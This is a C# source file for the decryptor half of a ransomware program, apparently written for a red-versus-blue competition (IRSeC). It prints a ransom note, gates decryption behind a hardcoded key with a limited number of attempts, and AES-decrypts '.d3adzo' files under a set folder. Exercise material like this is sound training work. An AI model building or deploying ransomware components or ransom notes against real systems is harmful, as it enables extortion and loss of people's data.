using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Security.Cryptography;

namespace decryptor
{
    class Program
    {
        static string key = "cyberhalloween";
        static string[] hits = { @"C:\pog" };
        static int ctr = 3;
        static void Main(string[] args)
        {
            string input = "";
            do {
                displayMessage();
                Console.Write("INPUT THE DECRYPTION KEY: ");
                input = Console.ReadLine();
                if (!input.Equals(key))
                {
                    ctr--;
                    if (ctr == 0) { throw new Exception(); }
                    Console.WriteLine("That's not right..." + ctr.ToString() + " more invalid attempts and your files go to the graveyard...");
                }

            } while (!input.Equals(key));

            Console.WriteLine("Congratulations, your files are being decrypted! Have a good rest of IRSeC and good luck!");
            foreach (string path in hits)
            {
                //return;
                decryptmain(path);
            }
        }

        static void displayMessage()
        {
            Console.WriteLine("---------------------------------------------------------------------------------------------\n" +
                "IMPORTANT, READ CAREFULLY! YOU'VE BEEN HIT BY RANSOMWARE!\n\n" +
                "DO NOT DELETE decryptor.exe ON YOUR DESKTOP, IT IS THE ONLY WAY TO DECRYPT YOUR FILES! You have " + ctr.ToString() + " attempts left...\n\n" +
                "Your files have been encrypted in the following directories:");
            foreach (string path in hits) { Console.WriteLine(path); }
            Console.WriteLine("\nWhat does this mean for you?\n\n" +
                "You can obtain your files back in one of three ways:\n" +
                "1. Use your backups if you have them to replace the encrypted files\n" +
                "2. Analyze the binary and obtain the decryption key\n" +
                "3. @d3adzo (Red) on discord for a challenge and tell him your location (remote/in the labs)\n" +
                "\nWith Love, d3adzo\n" +
                "---------------------------------------------------------------------------------------------");
        }

        static void decryptmain(string path)
        {
            string[] files = Directory.GetFiles(path, "*.d3adzo", SearchOption.AllDirectories);
            for (int i = 0; i < files.Length; i++)
            {
                try
                {
                    byte[] filebytes = File.ReadAllBytes(files[i]);

                    byte[] decrypted = decryptfile(filebytes);
                    Console.WriteLine(files[i]);
                    File.WriteAllBytes(files[i], decrypted);
                    File.Move(files[i], files[i].Substring(0, files[i].Length - 7));
                }
                catch (Exception) { continue; }
            }
        }

        static byte[] decryptfile(byte[] arr)
        {
            byte[] decrypted;
            PasswordDeriveBytes pdb = new PasswordDeriveBytes(key, new byte[] { 0x43, 0x87, 0x23, 0x72 });
            MemoryStream ms = new MemoryStream();
            Aes aes = new AesManaged();
            aes.Key = pdb.GetBytes(aes.KeySize / 8);
            aes.IV = pdb.GetBytes(aes.BlockSize / 8);
            CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(arr, 0, arr.Length);
            cs.Close();
            decrypted = ms.ToArray();

            return decrypted;
        }
    }
}
